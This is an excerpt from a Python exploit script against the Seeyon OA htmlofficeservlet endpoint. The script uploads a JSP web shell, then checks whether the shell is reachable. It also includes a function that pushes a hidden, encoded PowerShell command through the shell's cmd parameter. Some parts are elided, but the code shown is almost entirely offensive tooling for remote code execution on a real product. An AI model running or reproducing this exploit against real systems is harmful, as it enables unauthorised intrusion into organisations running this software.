...
def powershell_exp(shell):
    payload = """powershell -nop -w hidden -encodedcommand YOUCODE"""
    url = shell + "?pwd=fuckxxxx&cmd=cmd /c " + payload
    try:
...
def poc(url, shell_name="config_db1.jsp"):
    ...
    def_shell = open('/Users/rabbit/Desktop/shell.txt', "rb").read()
    ...
    try:
        requests.post(url=url + "/seeyon/htmlofficeservlet", data=payload, timeout=2)
        res = requests.get(url=shell_url, timeout=2).text
    except:
        return False

    if ":-)" in res:
        print("sussess", shell_url)
        #powershell_exp(shell_url)
        return shell_url
    else:
        return False
